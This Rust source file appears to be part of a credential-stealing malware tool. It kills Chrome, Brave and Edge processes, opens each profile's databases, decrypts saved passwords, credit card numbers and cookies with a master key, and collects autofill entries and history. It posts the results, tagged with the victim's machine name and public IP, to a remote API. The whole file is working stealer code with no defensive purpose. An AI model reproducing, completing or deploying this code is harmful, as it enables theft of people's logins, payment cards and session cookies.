use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use anyhow::{Result, anyhow};
use rusqlite::{Connection, params};
use serde_json::json;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

use crate::PUBLIC_IP;
use crate::utils::post_json_to_api_blocking;

pub struct MasterKeyData {
    pub browser_name: String,
    pub master_key: Vec<u8>,
}

pub struct DecryptionProcessor {
    output_dir: PathBuf,
}

impl DecryptionProcessor {
    pub fn new(output_dir: PathBuf, _verbose: bool) -> Self {
        if let Err(e) = fs::create_dir_all(&output_dir) {
            eprintln!(
                "Warning: Failed to create output directory {}: {}",
                output_dir.display(),
                e
            );
        }
        Self { output_dir }
    }

    pub fn process_master_key(&self, key_data: MasterKeyData) -> Result<()> {
        if key_data.master_key.len() != 32 {
            return Err(anyhow!(
                "Invalid master key size: expected 32 bytes, got {}",
                key_data.master_key.len()
            ));
        }

        let browser_config = self.get_browser_config(&key_data.browser_name)?;

        let browser_type = match key_data.browser_name.to_lowercase().as_str() {
            "chrome" | "google chrome" => "chrome",
            "brave" | "brave browser" => "brave",
            "edge" | "microsoft edge" => "edge",
            _ => {
                return Err(anyhow!("Unknown browser type: {}", key_data.browser_name));
            }
        };

        match crate::modules::browser::chromium::injection::process::kill_browser_processes(browser_type) {
            Ok(count) => {
                if count > 0 {
                    // Wait a moment for processes to fully terminate and release file locks
                    std::thread::sleep(std::time::Duration::from_millis(2000));
                } else {
                }
            }
            Err(_e) => {}
        }

        // Find all profiles for this browser
        let profiles = self.discover_profiles(&browser_config)?;

        if profiles.is_empty() {
            return Ok(());
        }

        // Process each profile
        for profile_path in profiles {
            self.process_profile(&profile_path, &browser_config, &key_data.master_key)?;
        }

        Ok(())
    }

    fn get_browser_config(&self, browser_name: &str) -> Result<BrowserConfig> {
        match browser_name.to_lowercase().as_str() {
            "chrome" | "google chrome" => Ok(BrowserConfig {
                name: "Chrome".to_string(),
                user_data_sub_path: "Google/Chrome/User Data".to_string(),
                extraction_configs: get_chrome_extraction_configs(),
            }),
            "brave" | "brave browser" => Ok(BrowserConfig {
                name: "Brave".to_string(),
                user_data_sub_path: "BraveSoftware/Brave-Browser/User Data".to_string(),
                extraction_configs: get_chrome_extraction_configs(), // Brave uses same structure as Chrome
            }),
            "edge" | "microsoft edge" => Ok(BrowserConfig {
                name: "Edge".to_string(),
                user_data_sub_path: "Microsoft/Edge/User Data".to_string(),
                extraction_configs: get_chrome_extraction_configs(), // Edge uses same structure as Chrome
            }),
            _ => Err(anyhow!("Unsupported browser: {}", browser_name)),
        }
    }

    fn discover_profiles(&self, browser_config: &BrowserConfig) -> Result<Vec<PathBuf>> {
        let local_app_data = std::env::var("LOCALAPPDATA")
            .map_err(|_| anyhow!("Could not get LOCALAPPDATA environment variable"))?;

        let user_data_root = PathBuf::from(local_app_data).join(&browser_config.user_data_sub_path);

        if !user_data_root.exists() {
            return Ok(Vec::new());
        }

        let mut unique_profiles = HashSet::new();

        // Check if root directory is a profile
        if self.is_profile_directory(&user_data_root, &browser_config.extraction_configs) {
            unique_profiles.insert(user_data_root.clone());
        }

        // Check subdirectories for profiles
        if let Ok(entries) = fs::read_dir(&user_data_root) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir()
                    && self.is_profile_directory(&path, &browser_config.extraction_configs)
                {
                    unique_profiles.insert(path);
                }
            }
        }

        Ok(unique_profiles.into_iter().collect())
    }

    fn is_profile_directory(&self, path: &Path, extraction_configs: &[ExtractionConfig]) -> bool {
        extraction_configs
            .iter()
            .any(|config| path.join(&config.db_relative_path).exists())
    }

    fn process_profile(
        &self,
        profile_path: &Path,
        browser_config: &BrowserConfig,
        master_key: &[u8],
    ) -> Result<()> {
        for extraction_config in &browser_config.extraction_configs {
            self.extract_data_from_profile(
                profile_path,
                extraction_config,
                master_key,
                &browser_config.name,
            )?;
        }

        Ok(())
    }

    fn extract_data_from_profile(
        &self,
        profile_path: &Path,
        extraction_config: &ExtractionConfig,
        master_key: &[u8],
        browser_name: &str,
    ) -> Result<()> {
        let db_path = profile_path.join(&extraction_config.db_relative_path);

        if !db_path.exists() {
            return Ok(());
        }

        // Open database with no-lock flag
        let db_uri = format!(
            "file:{}?nolock=1",
            db_path.to_string_lossy().replace('\\', "/")
        );
        let conn = Connection::open(&db_uri)
            .map_err(|e| anyhow!("Failed to open database {}: {}", db_path.display(), e))?;

        // Ensure output directory exists
        fs::create_dir_all(&self.output_dir)?;

        // Execute query and process results
        let mut stmt = conn.prepare(&extraction_config.sql_query)?;
        let mut rows = stmt.query(params![])?;

        let mut results = Vec::new();
        let mut count = 0;

        while let Some(row) = rows.next()? {
            if let Some(json_entry) = (extraction_config.json_formatter)(row, master_key)? {
                results.push(json_entry);
                count += 1;
            }
        }

        // Format results as a single browser data object for API
        if count > 0 {
            println!(
                "[*]      {} {} extracted and posting to API",
                count, extraction_config.output_file_name
            );

            let mut browser_data = serde_json::Map::new();
            browser_data.insert(
                "browser".to_string(),
                serde_json::Value::String(browser_name.to_string()),
            );
            browser_data.insert(
                "desktop_name".to_string(),
                serde_json::Value::String(crate::DESKTOP_NAME.to_string()),
            );
            browser_data.insert(
                "ip".to_string(),
                serde_json::Value::String(PUBLIC_IP.to_string()),
            );
            browser_data.insert(
                extraction_config.output_file_name.clone(),
                serde_json::Value::Array(results),
            );
            // Add DESKTOP_NAME to the payload
            let _ = post_json_to_api_blocking(&serde_json::Value::Object(browser_data), "browser");
        }

        Ok(())
    }
}

struct BrowserConfig {
    name: String,
    user_data_sub_path: String,
    extraction_configs: Vec<ExtractionConfig>,
}

struct ExtractionConfig {
    db_relative_path: String,
    sql_query: String,
    output_file_name: String,
    json_formatter: fn(&rusqlite::Row, &[u8]) -> Result<Option<serde_json::Value>>,
}

fn get_chrome_extraction_configs() -> Vec<ExtractionConfig> {
    vec![
        ExtractionConfig {
            db_relative_path: "Login Data".to_string(),
            sql_query: "SELECT origin_url, username_value, password_value FROM logins".to_string(),
            output_file_name: "passwords".to_string(),
            json_formatter: format_password_entry,
        },
        ExtractionConfig {
            db_relative_path: "Web Data".to_string(),
            sql_query: "SELECT name, value FROM autofill WHERE value != ''".to_string(),
            output_file_name: "autofill".to_string(),
            json_formatter: format_autofill_entry,
        },
        ExtractionConfig {
            db_relative_path: "Web Data".to_string(),
            sql_query: "SELECT guid, name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards".to_string(),
            output_file_name: "credit_cards".to_string(),
            json_formatter: format_credit_card_entry,
        },
        ExtractionConfig {
            db_relative_path: "Network/Cookies".to_string(),
            sql_query: "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies".to_string(),
            output_file_name: "cookies".to_string(),
            json_formatter: format_cookie_entry,
        },
        ExtractionConfig {
            db_relative_path: "History".to_string(),
            sql_query: "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000".to_string(),
            output_file_name: "history".to_string(),
            json_formatter: format_history_entry,
        }
    ]
}

fn decrypt_chrome_data(encrypted_data: &[u8], master_key: &[u8]) -> Result<String> {
    if encrypted_data.is_empty() {
        return Ok(String::new());
    }

    // Handle very short data
    if encrypted_data.len() < 3 {
        return Ok(String::from_utf8_lossy(encrypted_data).to_string());
    }
    // Check for v20 format first (used by Chrome/Brave)
    if encrypted_data.starts_with(b"v20") {
        return decrypt_v20_format(encrypted_data, master_key);
    }

    // Check for Edge v10/v11 format - handle differently based on length
    if encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
        // For very short v10 data (like 31 bytes total), treat as empty/unencrypted
        if encrypted_data.len() <= 31 {
            return Ok(String::new());
        }

        // Try normal v10 decryption for longer data
        match decrypt_v10_v11_format(encrypted_data, master_key) {
            Ok(result) => {
                return Ok(result);
            }
            Err(_e) => {
                // For Edge, if v10 decryption fails, try to handle gracefully
                return Ok(String::new());
            }
        }
    }

    // Try v20 format without prefix (Edge sometimes doesn't include the prefix)
    if let Ok(result) = try_decrypt_as_v20_without_prefix(encrypted_data, master_key) {
        return Ok(result);
    }

    // Try v10/v11 format without prefix (Chrome/Brave fallback)
    if let Ok(result) = try_decrypt_as_v10_without_prefix(encrypted_data, master_key) {
        return Ok(result);
    }
    // Fallback for unencrypted data
    Ok(String::from_utf8_lossy(encrypted_data).to_string())
}

fn try_decrypt_as_v20_without_prefix(encrypted_data: &[u8], master_key: &[u8]) -> Result<String> {
    const GCM_IV_LENGTH: usize = 12;
    const GCM_TAG_LENGTH: usize = 16;
    const MIN_LENGTH: usize = GCM_IV_LENGTH + GCM_TAG_LENGTH;

    if encrypted_data.len() < MIN_LENGTH {
        return Err(anyhow!("Data too short for v20 without prefix"));
    }

    // For Edge v20 format without prefix: IV (12) + ciphertext + tag (16)
    let iv = &encrypted_data[0..GCM_IV_LENGTH];
    let ciphertext_and_tag = &encrypted_data[GCM_IV_LENGTH..];

    if ciphertext_and_tag.len() < GCM_TAG_LENGTH {
        return Err(anyhow!("Ciphertext too short"));
    }

    let ciphertext = &ciphertext_and_tag[..ciphertext_and_tag.len() - GCM_TAG_LENGTH];
    let tag = &ciphertext_and_tag[ciphertext_and_tag.len() - GCM_TAG_LENGTH..];

    // Reconstruct the data for AES-GCM
    let mut encrypted_with_tag = Vec::with_capacity(ciphertext.len() + tag.len());
    encrypted_with_tag.extend_from_slice(ciphertext);
    encrypted_with_tag.extend_from_slice(tag);

    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let nonce = Nonce::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    let decrypted = cipher
        .decrypt(nonce, encrypted_with_tag.as_slice())
        .map_err(|e| anyhow!("v20 AES decryption failed: {}", e))?;

    String::from_utf8(decrypted).map_err(|e| anyhow!("Invalid UTF-8 in v20 decrypted data: {}", e))
}

fn try_decrypt_as_v10_without_prefix(encrypted_data: &[u8], master_key: &[u8]) -> Result<String> {
    const GCM_IV_LENGTH: usize = 12;
    const MIN_LENGTH: usize = GCM_IV_LENGTH + 16; // IV + minimum ciphertext

    if encrypted_data.len() < MIN_LENGTH {
        return Err(anyhow!("Data too short for v10 without prefix"));
    }

    // For v10/v11 without prefix: IV (12) + ciphertext with embedded tag
    let iv = &encrypted_data[0..GCM_IV_LENGTH];
    let encrypted = &encrypted_data[GCM_IV_LENGTH..];

    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let nonce = Nonce::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    let decrypted = cipher
        .decrypt(nonce, encrypted)
        .map_err(|e| anyhow!("v10 AES decryption failed: {}", e))?;

    String::from_utf8(decrypted).map_err(|e| anyhow!("Invalid UTF-8 in v10 decrypted data: {}", e))
}
fn decrypt_v20_format(encrypted_data: &[u8], master_key: &[u8]) -> Result<String> {
    const V20_PREFIX_LEN: usize = 3; // "v20"
    const GCM_IV_LENGTH: usize = 12;
    const GCM_TAG_LENGTH: usize = 16;
    const GCM_OVERHEAD_LENGTH: usize = V20_PREFIX_LEN + GCM_IV_LENGTH + GCM_TAG_LENGTH;

    if encrypted_data.len() < GCM_OVERHEAD_LENGTH {
        return Err(anyhow!("v20 encrypted data too short"));
    }

    // Extract components
    let iv = &encrypted_data[V20_PREFIX_LEN..V20_PREFIX_LEN + GCM_IV_LENGTH];
    let ciphertext_and_tag = &encrypted_data[V20_PREFIX_LEN + GCM_IV_LENGTH..];

    if ciphertext_and_tag.len() < GCM_TAG_LENGTH {
        return Err(anyhow!("v20 ciphertext too short"));
    }

    let ciphertext = &ciphertext_and_tag[..ciphertext_and_tag.len() - GCM_TAG_LENGTH];
    let tag = &ciphertext_and_tag[ciphertext_and_tag.len() - GCM_TAG_LENGTH..];

    // Reconstruct the data for AES-GCM
    let mut encrypted_with_tag = Vec::with_capacity(ciphertext.len() + tag.len());
    encrypted_with_tag.extend_from_slice(ciphertext);
    encrypted_with_tag.extend_from_slice(tag);

    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let nonce = Nonce::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    let decrypted = cipher
        .decrypt(nonce, encrypted_with_tag.as_slice())
        .map_err(|e| anyhow!("v20 AES decryption failed: {}", e))?;

    String::from_utf8(decrypted).map_err(|e| anyhow!("Invalid UTF-8 in v20 decrypted data: {}", e))
}

fn decrypt_cookie_data(encrypted_data: &[u8], master_key: &[u8]) -> Result<String> {
    if encrypted_data.is_empty() {
        return Ok(String::new());
    }

    // Handle very short data
    if encrypted_data.len() < 3 {
        return Ok(String::from_utf8_lossy(encrypted_data).to_string());
    }
    // Check for Edge v20 format first
    if encrypted_data.starts_with(b"v20") {
        let decrypted = decrypt_v20_format_raw(encrypted_data, master_key)?;
        // Apply 32-byte offset for cookies (as per C++ code)
        const VALUE_OFFSET: usize = 32;
        if decrypted.len() <= VALUE_OFFSET {
            return Ok(String::new());
        }
        return Ok(String::from_utf8_lossy(&decrypted[VALUE_OFFSET..]).to_string());
    }

    // Check for Chrome/Edge v10/v11 format
    if encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
        let decrypted_text = decrypt_v10_v11_format(encrypted_data, master_key)?;
        // For Edge cookies, we might need to apply the 32-byte offset here too
        // Let's try both with and without offset
        return Ok(decrypted_text);
    }

    // Try to decrypt without prefix and apply offset for Edge cookies
    if let Ok(decrypted_bytes) = try_decrypt_as_v20_without_prefix_raw(encrypted_data, master_key) {
        const VALUE_OFFSET: usize = 32;
        if decrypted_bytes.len() > VALUE_OFFSET {
            return Ok(String::from_utf8_lossy(&decrypted_bytes[VALUE_OFFSET..]).to_string());
        }
    }

    // Try v10/v11 without prefix for Chrome/Brave
    if let Ok(result) = try_decrypt_as_v10_without_prefix(encrypted_data, master_key) {
        return Ok(result);
    }

    // Fallback for unencrypted data
    Ok(String::from_utf8_lossy(encrypted_data).to_string())
}

fn try_decrypt_as_v20_without_prefix_raw(
    encrypted_data: &[u8],
    master_key: &[u8],
) -> Result<Vec<u8>> {
    const GCM_IV_LENGTH: usize = 12;
    const GCM_TAG_LENGTH: usize = 16;
    const MIN_LENGTH: usize = GCM_IV_LENGTH + GCM_TAG_LENGTH;

    if encrypted_data.len() < MIN_LENGTH {
        return Err(anyhow!("Data too short for v20 without prefix"));
    }

    let iv = &encrypted_data[0..GCM_IV_LENGTH];
    let ciphertext_and_tag = &encrypted_data[GCM_IV_LENGTH..];

    if ciphertext_and_tag.len() < GCM_TAG_LENGTH {
        return Err(anyhow!("Ciphertext too short"));
    }

    let ciphertext = &ciphertext_and_tag[..ciphertext_and_tag.len() - GCM_TAG_LENGTH];
    let tag = &ciphertext_and_tag[ciphertext_and_tag.len() - GCM_TAG_LENGTH..];

    let mut encrypted_with_tag = Vec::with_capacity(ciphertext.len() + tag.len());
    encrypted_with_tag.extend_from_slice(ciphertext);
    encrypted_with_tag.extend_from_slice(tag);

    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let nonce = Nonce::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    cipher
        .decrypt(nonce, encrypted_with_tag.as_slice())
        .map_err(|e| anyhow!("v20 AES decryption failed: {}", e))
}

fn decrypt_v20_format_raw(encrypted_data: &[u8], master_key: &[u8]) -> Result<Vec<u8>> {
    const V20_PREFIX_LEN: usize = 3; // "v20"
    const GCM_IV_LENGTH: usize = 12;
    const GCM_TAG_LENGTH: usize = 16;
    const GCM_OVERHEAD_LENGTH: usize = V20_PREFIX_LEN + GCM_IV_LENGTH + GCM_TAG_LENGTH;

    if encrypted_data.len() < GCM_OVERHEAD_LENGTH {
        return Err(anyhow!("v20 encrypted data too short"));
    }

    // Extract components
    let iv = &encrypted_data[V20_PREFIX_LEN..V20_PREFIX_LEN + GCM_IV_LENGTH];
    let ciphertext_and_tag = &encrypted_data[V20_PREFIX_LEN + GCM_IV_LENGTH..];

    if ciphertext_and_tag.len() < GCM_TAG_LENGTH {
        return Err(anyhow!("v20 ciphertext too short"));
    }

    let ciphertext = &ciphertext_and_tag[..ciphertext_and_tag.len() - GCM_TAG_LENGTH];
    let tag = &ciphertext_and_tag[ciphertext_and_tag.len() - GCM_TAG_LENGTH..];

    // Reconstruct the data for AES-GCM
    let mut encrypted_with_tag = Vec::with_capacity(ciphertext.len() + tag.len());
    encrypted_with_tag.extend_from_slice(ciphertext);
    encrypted_with_tag.extend_from_slice(tag);

    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let nonce = Nonce::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    cipher
        .decrypt(nonce, encrypted_with_tag.as_slice())
        .map_err(|e| anyhow!("v20 AES decryption failed: {}", e))
}

fn format_cookie_entry(
    row: &rusqlite::Row,
    master_key: &[u8],
) -> Result<Option<serde_json::Value>> {
    let host_key: String = row.get(0)?;
    let name: String = row.get(1)?;
    let encrypted_value: Vec<u8> = row.get(2)?;
    let path: String = row.get(3)?;
    let expires_utc: i64 = row.get(4)?;
    let is_secure: bool = row.get(5)?;
    let is_httponly: bool = row.get(6)?;

    let value = if !encrypted_value.is_empty() {
        // Use special cookie decryption that handles the 32-byte offset
        decrypt_cookie_data(&encrypted_value, master_key).unwrap_or_default()
    } else {
        String::new()
    };

    Ok(Some(json!({
        "host": host_key,
        "name": name,
        "value": value,
        "path": path,
        "expires_utc": expires_utc,
        "secure": is_secure,
        "httponly": is_httponly
    })))
}

fn decrypt_v10_v11_format(encrypted_data: &[u8], master_key: &[u8]) -> Result<String> {
    if encrypted_data.len() < 15 {
        return Err(anyhow!("v10/v11 encrypted data too short"));
    }

    // Skip the version prefix and extract IV and encrypted data
    let iv = &encrypted_data[3..15]; // 12 bytes IV
    let encrypted = &encrypted_data[15..];

    // Check if we have enough data for actual encryption
    if encrypted.len() <= 16 {
        // For Edge's short v10 entries, return empty string rather than failing
        return Ok(String::new());
    }

    let key = Key::<Aes256Gcm>::from_slice(master_key);
    let nonce = Nonce::from_slice(iv);
    let cipher = Aes256Gcm::new(key);

    let decrypted = cipher
        .decrypt(nonce, encrypted)
        .map_err(|e| anyhow!("v10/v11 AES decryption failed: {}", e))?;

    String::from_utf8(decrypted)
        .map_err(|e| anyhow!("Invalid UTF-8 in v10/v11 decrypted data: {}", e))
}
fn format_password_entry(
    row: &rusqlite::Row,
    master_key: &[u8],
) -> Result<Option<serde_json::Value>> {
    let origin_url: String = row.get(0)?;
    let username: String = row.get(1)?;
    let encrypted_password: Vec<u8> = row.get(2)?;

    let password = if !encrypted_password.is_empty() {
        decrypt_chrome_data(&encrypted_password, master_key)?
    } else {
        String::new()
    };

    if !password.is_empty() {
        Ok(Some(json!({
            "url": origin_url,
            "username": username,
            "password": password
        })))
    } else {
        Ok(None)
    }
}

fn format_autofill_entry(
    row: &rusqlite::Row,
    _master_key: &[u8],
) -> Result<Option<serde_json::Value>> {
    let name: String = row.get(0)?;
    let value: String = row.get(1)?;

    Ok(Some(json!({
        "name": name,
        "value": value
    })))
}

fn format_credit_card_entry(
    row: &rusqlite::Row,
    master_key: &[u8],
) -> Result<Option<serde_json::Value>> {
    let guid: String = row.get(0)?;
    let name_on_card: String = row.get(1)?;
    let encrypted_card_number: Vec<u8> = row.get(2)?;
    let expiration_month: i32 = row.get(3)?;
    let expiration_year: i32 = row.get(4)?;

    let card_number = if !encrypted_card_number.is_empty() {
        decrypt_chrome_data(&encrypted_card_number, master_key)?
    } else {
        String::new()
    };

    if !card_number.is_empty() {
        Ok(Some(json!({
            "guid": guid,
            "name_on_card": name_on_card,
            "card_number": card_number,
            "expiration_month": expiration_month,
            "expiration_year": expiration_year
        })))
    } else {
        Ok(None)
    }
}

fn format_history_entry(
    row: &rusqlite::Row,
    _master_key: &[u8],
) -> Result<Option<serde_json::Value>> {
    let url: String = row.get(0)?;
    let title: String = row.get(1)?;
    let visit_count: i32 = row.get(2)?;
    let last_visit_time: i64 = row.get(3)?;

    Ok(Some(json!({
        "url": url,
        "title": title,
        "visit_count": visit_count,
        "last_visit_time": last_visit_time
    })))
}
